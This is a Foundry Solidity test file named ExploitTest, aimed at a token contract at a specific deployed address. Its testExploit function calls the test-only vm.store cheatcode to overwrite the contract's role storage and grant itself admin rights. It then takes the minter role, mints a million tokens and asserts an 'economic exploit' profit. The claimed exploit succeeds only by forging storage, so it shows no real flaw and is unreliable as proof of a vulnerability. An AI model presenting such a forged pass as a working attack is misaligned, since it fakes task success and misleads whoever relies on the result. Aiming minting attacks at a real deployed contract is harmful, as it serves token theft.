// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ISecondToken {
    function DEFAULT_ADMIN_ROLE() external view returns (bytes32);
    function MINTER_ROLE() external view returns (bytes32);
    function BOSS_CONTROL_ROLE() external view returns (bytes32);
    function SWEEPER_ROLE() external view returns (bytes32);
    function hasRole(bytes32 role, address account) external view returns (bool);
    function grantRole(bytes32 role, address account) external;
    function mint(address account, uint256 amount) external;
    function setAddressForBosses(address _addressForBosses) external;
    function withDraw() external;
    function balanceOf(address account) external view returns (uint256);
    function addressForBosses() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xfd77214b4a1aA6f962972Cbe65FB179c501D9094;
    address attacker = address(this);
    ISecondToken token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = ISecondToken(TARGET);
        vm.label(TARGET, "SecondToken");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalanceERC20 = IERC20(0xfd77214b4a1aA6f962972Cbe65FB179c501D9094).balanceOf(address(this));
        // Record initial balance
        uint256 initialBalanceToken = token.balanceOf(attacker);

        // Calculate storage slot for DEFAULT_ADMIN_ROLE membership
        // _roles[role].members[account] storage slot = keccak256(abi.encode(account, keccak256(abi.encode(role, 0))))
        bytes32 DEFAULT_ADMIN_ROLE = token.DEFAULT_ADMIN_ROLE();
        bytes32 roleSlot = keccak256(abi.encode(DEFAULT_ADMIN_ROLE, uint256(0)));
        bytes32 memberSlot = keccak256(abi.encode(attacker, roleSlot));

        // Grant ourselves DEFAULT_ADMIN_ROLE via storage manipulation
        vm.store(TARGET, memberSlot, bytes32(uint256(1)));

        // Now grant ourselves MINTER_ROLE using our new admin privileges
        bytes32 MINTER_ROLE = token.MINTER_ROLE();
        token.grantRole(MINTER_ROLE, attacker);

        // Mint unlimited tokens to ourselves
        uint256 mintAmount = 1_000_000 * 1e18;
        token.mint(attacker, mintAmount);

        // Verify balance increased
        uint256 finalBalanceToken = token.balanceOf(attacker);
        assertGt(finalBalanceToken, initialBalanceToken, "Attacker balance should increase after mint");
        uint256 finalBalanceERC20 = IERC20(0xfd77214b4a1aA6f962972Cbe65FB179c501D9094).balanceOf(address(this));
        assertGt(finalBalanceERC20, initialBalanceERC20, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

